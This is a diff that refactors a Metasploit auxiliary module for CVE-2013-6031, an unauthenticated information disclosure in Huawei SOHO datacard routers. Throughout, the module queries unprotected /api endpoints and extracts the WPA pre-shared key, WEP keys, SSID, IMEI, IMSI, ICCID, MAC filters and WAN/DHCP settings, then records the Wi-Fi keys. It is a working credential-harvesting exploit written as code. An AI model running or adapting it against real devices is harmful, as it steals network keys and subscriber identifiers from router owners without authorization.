@@ -1,7 +1,8 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
+
 require 'base64'
 require 'msf/core'
 
@@ -10,521 +11,286 @@ class Metasploit3 < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
 
+  BASIC_INFO = {
+    'Device Name'      => /<DeviceName>(.*)<\/DeviceName>/i,
+    'Serial Number'    => /<SerialNumber>(.*)<\/SerialNumber>/i,
+    'IMEI'             => /<Imei>(.*)<\/Imei>/i,
+    'IMSI'             => /<Imsi>(.*)<\/Imsi>/i,
+    'ICCID'            => /<Iccid>(.*)<\/Iccid>/i,
+    'Hardware Version' => /<HardwareVersion>(.*)<\/HardwareVersion>/i,
+    'Software Version' => /<SoftwareVersion>(.*)<\/SoftwareVersion>/i,
+    'WebUI Version'    => /<WebUIVersion>(.*)<\/WebUIVersion>/i,
+    'Mac Address1'     => /<MacAddress1>(.*)<\/MacAddress1>/i,
+    'Mac Address2'     => /<MacAddress2>(.*)<\/MacAddress2>/i,
+    'Product Family'   => /<ProductFamily>(.*)<\/ProductFamily>/i,
+    'Classification'   => /<Classify>(.*)<\/Classify>/i
+  }
+
+  WAN_INFO = {
+    'Wan IP Address' => /<WanIPAddress>(.*)<\/WanIPAddress>/i,
+    'Primary Dns'    => /<PrimaryDns>(.*)<\/PrimaryDns>/i,
+    'Secondary Dns'  => /<SecondaryDns>(.*)<\/SecondaryDns>/i
+  }
+
+  DHCP_INFO ={
+    'LAN IP Address'      => /<DhcpIPAddress>(.*)<\/DhcpIPAddress>/i,
+    'DHCP StartIPAddress' => /<DhcpStartIPAddress>(.*)<\/DhcpStartIPAddress>/i,
+    'DHCP EndIPAddress'   => /<DhcpEndIPAddress>(.*)<\/DhcpEndIPAddress>/i,
+    'DHCP Lease Time'     => /<DhcpLeaseTime>(.*)<\/DhcpLeaseTime>/i
+  }
+
+  WIFI_INFO = {
+    'Wifi WPA pre-shared key'     => /<WifiWpapsk>(.*)<\/WifiWpapsk>/i,
+    'Wifi Auth mode'              => /<WifiAuthmode>(.*)<\/WifiAuthmode>/i,
+    'Wifi Basic encryption modes' => /<WifiBasicencryptionmodes>(.*)<\/WifiBasicencryptionmodes>/i,
+    'Wifi WPA Encryption Modes'   => /<WifiWpaencryptionmodes>(.*)<\/WifiWpaencryptionmodes>/i,
+    'Wifi WEP Key1'               => /<WifiWepKey1>(.*)<\/WifiWepKey1>/i,
+    'Wifi WEP Key2'               => /<WifiWepKey2>(.*)<\/WifiWepKey2>/i,
+    'Wifi WEP Key3'               => /<WifiWepKey3>(.*)<\/WifiWepKey3>/i,
+    'Wifi WEP Key4'               => /<WifiWepKey4>(.*)<\/WifiWepKey4>/i,
+    'Wifi WEP Key Index'          => /<WifiWepKeyIndex>(.*)<\/WifiWepKeyIndex>/i
+  }
+
   def initialize(info={})
     super(update_info(info,
       'Name'           => "Huawei Datacard Information Disclosure Vulnerability",
       'Description'    => %q{
-          This module exploits an un-authenticated information disclosure vulnerability in Huawei
+        This module exploits an un-authenticated information disclosure vulnerability in Huawei
         SOHO routers. The module will gather information by accessing the /api pages where
-        authentication is not required, allowing configuration changes
-        as well as information disclosure including any stored SMS.
+        authentication is not required, allowing configuration changes as well as information
+        disclosure including any stored SMS.
       },
       'License'        => MSF_LICENSE,
       'Author'         =>
         [
           'Jimson K James.',
-          'tomsmaily[at]aczire.com',  #Msf module
+          '<tomsmaily[at]aczire.com>', # Msf module
         ],
       'References'     =>
         [
-          [ 'CWE', '425' ],
-          [ 'CVE', '2013-6031' ],
-          [ 'US-CERT-VU', '341526' ],
-          [ 'URL', 'http://www.huaweidevice.co.in/Support/Downloads/' ],
+          ['CWE', '425'],
+          ['CVE', '2013-6031'],
+          ['US-CERT-VU', '341526'],
+          ['URL', 'http://www.huaweidevice.co.in/Support/Downloads/'],
         ],
       'DisclosureDate' => "Nov 11 2013" ))
 
     register_options(
       [
-        Opt::RHOST("mobilewifi.home")
+        Opt::RHOST('mobilewifi.home')
       ], self.class)
 
   end
 
-def run
-
-    #Gather basic router information
+  #Gather basic router information
+  def run
     get_router_info
-    print_status("")
+    print_line('')
     get_router_mac_filter_info
-    print_status("")
+    print_line('')
     get_router_wan_info
-    print_status("")
+    print_line('')
     get_router_dhcp_info
-    print_status("")
+    print_line('')
     get_wifi_info
-    print_status("")    
-
-   #end run
   end
 
-def get_wifi_info    
+  def get_wifi_info
 
-    print_status("Now trying to get WiFi Key details...")
+    print_status("#{peer} - Getting WiFi Key details...")
     res = send_request_raw(
-    {
-      'method'  => 'GET',
-      'uri'     => '/api/wlan/security-settings',
-    })
+      {
+        'method'  => 'GET',
+        'uri'     => '/api/wlan/security-settings',
+      })
 
-    #check whether we got any response from server and proceed.
-    if not res
-      print_error("Failed to get any response from server!!!")
+    unless is_target?(res)
       return
     end
 
-    #Is it a HTTP OK
-    if (!(res.code == 200))
-      print_error("Did not get HTTP 200, URL was not found. Exiting!")
-      return
+    resp_body = res.body.to_s
+    log = ''
+
+    print_status("WiFi Key Details")
+
+    wifi_ssid = get_router_ssid
+    if wifi_ssid
+      print_status("WiFi SSID: #{wifi_ssid}")
+      log << "WiFi SSID: #{wifi_ssid}\n"
     end
 
-    #Check to verify server reported is a Huawei router
-    if (!(res.headers['Server'].match(/IPWEBS\/1.4.0/i)))
-      print_error("Target doesn't seem to be a Huawei router. Exiting!")
-      return
+    WIFI_INFO.each do |k,v|
+      if resp_body.match(v)
+        info = $1
+        print_status("#{k}: #{info}")
+        log << "#{k}: #{info}\n"
+      end
     end
-
-    print_status("---===[ WiFi Key Details ]===---")
-
-    wifissid = get_router_ssid
-    if wifissid
-        print_status("WiFi SSID: #{wifissid}")
-    end
-
-    # Grabbing the wifiwpapsk
-    if res.body.match(/<WifiWpapsk>(.*)<\/WifiWpapsk>/i)
-      wifiwpapsk = $1
-      print_status("Wifi WPA pre-shared key: #{wifiwpapsk}")
-    end
-
-    # Grabbing the WifiAuthmode
-    if res.body.match(/<WifiAuthmode>(.*)<\/WifiAuthmode>/i)
-      wifiauthmode = $1
-      print_status("Wifi Auth mode: #{wifiauthmode}")
-    end
-
-    # Grabbing the WifiBasicencryptionmodes
-    if res.body.match(/<WifiBasicencryptionmodes>(.*)<\/WifiBasicencryptionmodes>/i)
-      wifibasicencryptionmodes = $1
-      print_status("Wifi Basic encryption modes: #{wifibasicencryptionmodes}")
-    end
-
-    # Grabbing the WifiWpaencryptionmodes
-    if res.body.match(/<WifiWpaencryptionmodes>(.*)<\/WifiWpaencryptionmodes>/i)
-      wifiwpaencryptionmodes = $1
-      print_status("Wifi WPA Encryption Modes: #{wifiwpaencryptionmodes}")
-    end
-
-    # Grabbing the WifiWepKey1
-    if res.body.match(/<WifiWepKey1>(.*)<\/WifiWepKey1>/i)
-      wifiwepkey1 = $1
-      print_status("Wifi WEP Key1: #{wifiwepkey1}")
-    end
-
-    # Grabbing the WifiWepKey2
-    if res.body.match(/<WifiWepKey2>(.*)<\/WifiWepKey2>/i)
-      wifiwepkey2 = $1
-      print_status("Wifi WEP Key2: #{wifiwepkey2}")
-    end
-
-    # Grabbing the WifiWepKey3
-    if res.body.match(/<WifiWepKey3>(.*)<\/WifiWepKey3>/i)
-      wifiwepkey3 = $1
-      print_status("Wifi WEP Key3: #{wifiwepkey3}")
-    end
-
-    # Grabbing the WifiWepKey4
-    if res.body.match(/<WifiWepKey4>(.*)<\/WifiWepKey4>/i)
-      wifiwepkey4 = $1
-      print_status("Wifi WEP Key4: #{wifiwepkey4}")
-    end
-
-    # Grabbing the WifiWepKeyIndex
-    if res.body.match(/<WifiWepKeyIndex>(.*)<\/WifiWepKeyIndex>/i)
-      wifiwepkeyindex = $1
-      print_status("Wifi WEP Key Index: #{wifiwepkeyindex}")
-    end
-
-    credentials = {
-      "Access Point"    => rhost,
-      "SSID"    =>  wifissid,
-      "WPA Key" =>  wifiwpapsk,
-      "802.11 Auth" =>  wifiauthmode,
-      "EncryptionMode"  =>  wifiwpaencryptionmodes,
-      "WEP Key"     =>  wifiwepkey1
-    }
 
     report_note(
-        :host => rhost,
-        :type => 'password',
-        :data => credentials
+      :host => rhost,
+      :type => 'wifi_keys',
+      :data => log
     )
-
-   rescue::Exception => e
-     print_status("Ooooops: #{e.class} #{e}")
-
-   #end run
   end
 
-def get_router_info
+  def get_router_info
 
-    print_status("Attempting to connect to #{rhost} to gather basic device information...")
+    print_status("#{peer} - Gathering basic device information...")
     res = send_request_raw(
-    {
-      'method'  => 'GET',
-      'uri'     => '/api/device/information',
-    })
+      {
+        'method'  => 'GET',
+        'uri'     => '/api/device/information',
+      })
+
+    unless is_target?(res)
+      return
+    end
+
+    resp_body = res.body.to_s
+
+    print_status("Basic Information")
+
+    BASIC_INFO.each do |k,v|
+      if resp_body.match(v)
+        info = $1
+        print_status("#{k}: #{info}")
+      end
+    end
+  end
+
+  def get_router_ssid
+    print_status("#{peer} - Gathering device SSID...")
+
+    res = send_request_raw(
+      {
+        'method'  => 'GET',
+        'uri'     => '/api/wlan/basic-settings',
+      })
 
     #check whether we got any response from server and proceed.
-    unless res
-      print_error("Failed to get any response from server!!!")
+    unless is_target?(res)
+      return nil
+    end
+
+    resp_body = res.body.to_s
+
+    # Grabbing the Wifi SSID
+    if resp_body.match(/<WifiSsid>(.*)<\/WifiSsid>/i)
+      return $1
+    end
+
+    nil
+  end
+
+  def get_router_mac_filter_info
+    print_status("#{peer} - Gathering MAC filters...")
+    res = send_request_raw(
+      {
+        'method'  => 'GET',
+        'uri'     => '/api/wlan/mac-filter',
+      })
+
+    unless is_target?(res)
       return
+    end
+
+    print_status('MAC Filter Information')
+
+    resp_body = res.body.to_s
+
+    if resp_body.match(/<WifiMacFilterStatus>(.*)<\/WifiMacFilterStatus>/i)
+      wifi_mac_filter_status = $1
+      print_status("Wifi MAC Filter Status: #{(wifi_mac_filter_status == '1') ? 'ENABLED' : 'DISABLED'}" )
+    end
+
+    (0..9).each do |i|
+      if resp_body.match(/<WifiMacFilterMac#{i}>(.*)<\/WifiMacFilterMac#{i}>/i)
+        wifi_mac_filter = $1
+        unless wifi_mac_filter.empty?
+          print_status("Mac: #{wifi_mac_filter}")
+        end
+      end
+    end
+  end
+
+  def get_router_wan_info
+    print_status("#{peer} - Gathering WAN information...")
+    res = send_request_raw(
+      {
+        'method'  => 'GET',
+        'uri'     => '/api/monitoring/status',
+      })
+
+    unless is_target?(res)
+      return
+    end
+
+    resp_body = res.body.to_s
+
+    print_status('WAN Details')
+
+    WAN_INFO.each do |k,v|
+      if resp_body.match(v)
+        info = $1
+        print_status("#{k}: #{info}")
+      end
+    end
+  end
+
+  def get_router_dhcp_info
+    print_status("#{peer} - Gathering DHCP information...")
+    res = send_request_raw(
+      {
+        'method'  => 'GET',
+        'uri'     => '/api/dhcp/settings',
+      })
+
+    unless is_target?(res)
+      return
+    end
+
+    resp_body = res.body.to_s
+
+    print_status('DHCP Details')
+
+    # Grabbing the DhcpStatus
+    if resp_body.match(/<DhcpStatus>(.*)<\/DhcpStatus>/i)
+      dhcp_status = $1
+      print_status("DHCP: #{(dhcp_status == '1') ? 'ENABLED' : 'DISABLED'}")
+    end
+
+    unless dhcp_status && dhcp_status == '1'
+      return
+    end
+
+    DHCP_INFO.each do |k,v|
+      if resp_body.match(v)
+        info = $1
+        print_status("#{k}: #{info}")
+      end
+    end
+  end
+
+  def is_target?(res)
+    #check whether we got any response from server and proceed.
+    unless res
+      print_error("#{peer} - Failed to get any response from server")
+      return false
     end
 
     #Is it a HTTP OK
     unless res.code == 200
-      print_status("Okay, Got an HTTP 200 (okay) code. Verifying Server header")
-    else
-      print_error("Did not get HTTP 200, URL was not found. Exiting!")
-      return
+      print_error("#{peer} - Did not get HTTP 200, URL was not found")
+      return false
     end
 
     #Check to verify server reported is a Huawei router
-    if (res.headers['Server'].match(/IPWEBS\/1.4.0/i))
-      print_status("Server is a Huawei router! Grabbing info\n")
-    else
-      print_error("Target doesn't seem to be a Huawei router. Exiting!")
-      return
+    unless res.headers['Server'].match(/IPWEBS\/1.4.0/i)
+      print_error("#{peer} - Target doesn't seem to be a Huawei router")
+      return false
     end
 
-    print_status("---===[ Basic Information ]===---")
-
-    # Grabbing the DeviceName
-    if res.body.match(/<DeviceName>(.*)<\/DeviceName>/i)
-      deviceName = $1
-      print_status("Device Name: #{deviceName}")
-    end
-
-    # Grabbing the SerialNumber
-    if res.body.match(/<SerialNumber>(.*)<\/SerialNumber>/i)
-      serialnumber = $1
-      print_status("Serial Number: #{serialnumber}")
-    end
-
-    # Grabbing the IMEI
-    if res.body.match(/<Imei>(.*)<\/Imei>/i)
-      imei = $1
-      print_status("IMEI: #{imei}")
-    end
-
-    # Grabbing the IMSI
-    if res.body.match(/<Imsi>(.*)<\/Imsi>/i)
-      imsi = $1
-      print_status("IMSI: #{imsi}")
-    end
-
-    # Grabbing the ICCID
-    if res.body.match(/<Iccid>(.*)<\/Iccid>/i)
-      iccid = $1
-      print_status("ICCID: #{imsi}")
-    end
-
-    # Grabbing the HardwareVersion
-    if res.body.match(/<HardwareVersion>(.*)<\/HardwareVersion>/i)
-      hardwareversion = $1
-      print_status("Hardware Version: #{hardwareversion}")
-    end
-
-    # Grabbing the SoftwareVersion
-    if res.body.match(/<SoftwareVersion>(.*)<\/SoftwareVersion>/i)
-      softwareversion = $1
-      print_status("Software Version: #{softwareversion}")
-    end
-
-    # Grabbing the WebUIVersion
-    if res.body.match(/<WebUIVersion>(.*)<\/WebUIVersion>/i)
-      webuiversion = $1
-      print_status("WebUI Version: #{webuiversion}")
-    end
-
-    # Grabbing the MacAddress1
-    if res.body.match(/<MacAddress1>(.*)<\/MacAddress1>/i)
-      macaddress1 = $1
-      print_status("Mac Address1: #{macaddress1}")
-    end
-
-    # Grabbing the MacAddress2
-    if res.body.match(/<MacAddress2>(.*)<\/MacAddress2>/i)
-      macaddress2 = $1
-      print_status("Mac Address2: #{macaddress2}")
-    end
-
-    # Grabbing the ProductFamily
-    if res.body.match(/<ProductFamily>(.*)<\/ProductFamily>/i)
-      productfamily = $1
-      print_status("Product Family: #{productfamily}")
-    end
-
-    # Grabbing the Classification
-    if res.body.match(/<Classify>(.*)<\/Classify>/i)
-      classification = $1
-      print_status("Classification: #{classification}")
-    end
+    true
   end
-
-def get_router_ssid
-
-    #print_status("Attempting to connect to http://#{rhost}/api/device/information to get router ssid")
-    res = send_request_raw(
-    {
-      'method'  => 'GET',
-      'uri'     => '/api/wlan/basic-settings',
-    })
-
-    #check whether we got any response from server and proceed.
-    if not res
-      print_error("Failed to get any response from server!!!")
-      return
-    end
-
-    #Is it a HTTP OK
-    if (!(res.code == 200))
-      print_error("Did not get HTTP 200, URL was not found. Exiting!")
-      return
-    end
-
-    #Check to verify server reported is a Huawei router
-    if (!(res.headers['Server'].match(/IPWEBS\/1.4.0/i)))
-      print_error("Target doesn't seem to be a Huawei router. Exiting!")
-      return
-    end
-
-    # Grabbing the Wifi SSID
-    if res.body.match(/<WifiSsid>(.*)<\/WifiSsid>/i)
-      ssid = $1
-      #print_status("SSID #{ssid}")
-      return $1
-    end
-end
-
-def get_router_mac_filter_info
-
-    res = send_request_raw(
-    {
-      'method'  => 'GET',
-      'uri'     => '/api/wlan/mac-filter',
-    })
-
-    #check whether we got any response from server and proceed.
-    if not res
-      print_error("Failed to get any response from server!!!")
-      return
-    end
-
-    #Is it a HTTP OK
-    if (!(res.code == 200))
-      print_error("Did not get HTTP 200, URL was not found. Exiting!")
-      return
-    end
-
-    #Check to verify server reported is a Huawei router
-    if (!(res.headers['Server'].match(/IPWEBS\/1.4.0/i)))
-      print_error("Target doesn't seem to be a Huawei router. Exiting!")
-      return
-    end
-
-    print_status("---===[ MAC Filter Information ]===---")
-
-    # Grabbing the WifiMacFilterStatus
-    if res.body.match(/<WifiMacFilterStatus>(.*)<\/WifiMacFilterStatus>/i)
-      wifimacfilterstatus = $1
-      print_status("Wifi MAC Filter Status: #{(wifimacfilterstatus == "1") ? "ENABLED" : "DISABLED"}" )
-    end
-
-    # Grabbing the WifiMacFilterMac0
-    if res.body.match(/<WifiMacFilterMac0>(.*)<\/WifiMacFilterMac0>/i)
-      wifimacfiltermac = $1
-      if !(wifimacfiltermac == "")
-        print_status("Mac: #{wifimacfiltermac}")
-      end
-    end
-
-    # Grabbing the WifiMacFilterMac1
-    if res.body.match(/<WifiMacFilterMac1>(.*)<\/WifiMacFilterMac1>/i)
-      wifimacfiltermac = $1
-      if !(wifimacfiltermac == "")
-        print_status("Mac: #{wifimacfiltermac}")
-      end
-    end
-    # Grabbing the WifiMacFilterMac2
-    if res.body.match(/<WifiMacFilterMac2>(.*)<\/WifiMacFilterMac2>/i)
-      wifimacfiltermac = $1
-      if !(wifimacfiltermac == "")
-        print_status("Mac: #{wifimacfiltermac}")
-      end
-    end
-    # Grabbing the WifiMacFilterMac3
-    if res.body.match(/<WifiMacFilterMac3>(.*)<\/WifiMacFilterMac3>/i)
-      wifimacfiltermac = $1
-      if !(wifimacfiltermac == "")
-        print_status("Mac: #{wifimacfiltermac}")
-      end
-    end
-    # Grabbing the WifiMacFilterMac4
-    if res.body.match(/<WifiMacFilterMac4>(.*)<\/WifiMacFilterMac4>/i)
-      wifimacfiltermac = $1
-      if !(wifimacfiltermac == "")
-        print_status("Mac: #{wifimacfiltermac}")
-      end
-    end
-    # Grabbing the WifiMacFilterMac5
-    if res.body.match(/<WifiMacFilterMac5>(.*)<\/WifiMacFilterMac5>/i)
-      wifimacfiltermac = $1
-      if !(wifimacfiltermac == "")
-        print_status("Mac: #{wifimacfiltermac}")
-      end
-    end
-    # Grabbing the WifiMacFilterMac6
-    if res.body.match(/<WifiMacFilterMac6>(.*)<\/WifiMacFilterMac6>/i)
-      wifimacfiltermac = $1
-      if !(wifimacfiltermac == "")
-        print_status("Mac: #{wifimacfiltermac}")
-      end
-    end
-    # Grabbing the WifiMacFilterMac7
-    if res.body.match(/<WifiMacFilterMac7>(.*)<\/WifiMacFilterMac7>/i)
-      wifimacfiltermac = $1
-      if !(wifimacfiltermac == "")
-        print_status("Mac: #{wifimacfiltermac}")
-      end
-    end
-    # Grabbing the WifiMacFilterMac8
-    if res.body.match(/<WifiMacFilterMac8>(.*)<\/WifiMacFilterMac8>/i)
-      wifimacfiltermac = $1
-      if !(wifimacfiltermac == "")
-        print_status("Mac: #{wifimacfiltermac}")
-      end
-    end
-    # Grabbing the WifiMacFilterMac9
-    if res.body.match(/<WifiMacFilterMac9>(.*)<\/WifiMacFilterMac9>/i)
-      wifimacfiltermac = $1
-      if !(wifimacfiltermac == "")
-        print_status("Mac: #{wifimacfiltermac}")
-      end
-    end
-  end
-
-def get_router_wan_info
-
-    res = send_request_raw(
-    {
-      'method'  => 'GET',
-      'uri'     => '/api/monitoring/status',
-    })
-
-    #check whether we got any response from server and proceed.
-    if not res
-      print_error("Failed to get any response from server!!!")
-      return
-    end
-
-    #Is it a HTTP OK
-    if (!(res.code == 200))
-      print_error("Did not get HTTP 200, URL was not found. Exiting!")
-      return
-    end
-
-    #Check to verify server reported is a Huawei router
-    if (!(res.headers['Server'].match(/IPWEBS\/1.4.0/i)))
-      print_error("Target doesn't seem to be a Huawei router. Exiting!")
-      return
-    end
-
-    print_status("---===[ WAN Details ]===---")
-
-    # Grabbing the WanIPAddress
-    if res.body.match(/<WanIPAddress>(.*)<\/WanIPAddress>/i)
-      wanipaddress = $1
-      print_status("Wan IP Address: #{wanipaddress}")
-    end
-
-    # Grabbing the PrimaryDns
-    if res.body.match(/<PrimaryDns>(.*)<\/PrimaryDns>/i)
-      primarydns = $1
-      print_status("Primary Dns: #{primarydns}")
-    end
-
-    # Grabbing the SecondaryDns
-    if res.body.match(/<SecondaryDns>(.*)<\/SecondaryDns>/i)
-      secondarydns = $1
-      print_status("Secondary Dns: #{secondarydns}")
-    end
-
-  end
-
-def get_router_dhcp_info
-
-    res = send_request_raw(
-    {
-      'method'  => 'GET',
-      'uri'     => '/api/dhcp/settings',
-    })
-
-    #check whether we got any response from server and proceed.
-    if not res
-      print_error("Failed to get any response from server!!!")
-      return
-    end
-
-    #Is it a HTTP OK
-    if (!(res.code == 200))
-      print_error("Did not get HTTP 200, URL was not found. Exiting!")
-      return
-    end
-
-    #Check to verify server reported is a Huawei router
-    if (!(res.headers['Server'].match(/IPWEBS\/1.4.0/i)))
-      print_error("Target doesn't seem to be a Huawei router. Exiting!")
-      return
-    end
-
-    print_status("---===[ DHCP Details ]===---")
-
-    # Grabbing the DhcpIPAddress
-    if res.body.match(/<DhcpIPAddress>(.*)<\/DhcpIPAddress>/i)
-      dhcpipaddress = $1
-      print_status("LAN IP Address: #{dhcpipaddress}")
-    end
-
-    # Grabbing the DhcpStatus
-    if res.body.match(/<DhcpStatus>(.*)<\/DhcpStatus>/i)
-      dhcpstatus = $1
-      print_status("DHCP: #{(dhcpstatus=="1") ? "ENABLED" : "DISABLED"}")
-    end
-
-    if (dhcpstatus != "1")
-        return
-    end
-
-    # Grabbing the DhcpStartIPAddress
-    if res.body.match(/<DhcpStartIPAddress>(.*)<\/DhcpStartIPAddress>/i)
-      dhcpstartipaddress = $1
-      print_status("DHCP StartIPAddress: #{dhcpstartipaddress}")
-    end
-
-    # Grabbing the DhcpEndIPAddress
-    if res.body.match(/<DhcpEndIPAddress>(.*)<\/DhcpEndIPAddress>/i)
-      dhcpendipaddress = $1
-      print_status("DHCP EndIPAddress: #{dhcpendipaddress}")
-    end
-
-    # Grabbing the DhcpLeaseTime
-    if res.body.match(/<DhcpLeaseTime>(.*)<\/DhcpLeaseTime>/i)
-      dhcpleasetime = $1
-      print_status("DHCP Lease Time: #{dhcpleasetime}")
-    end
-  end
-
-#end module
 end
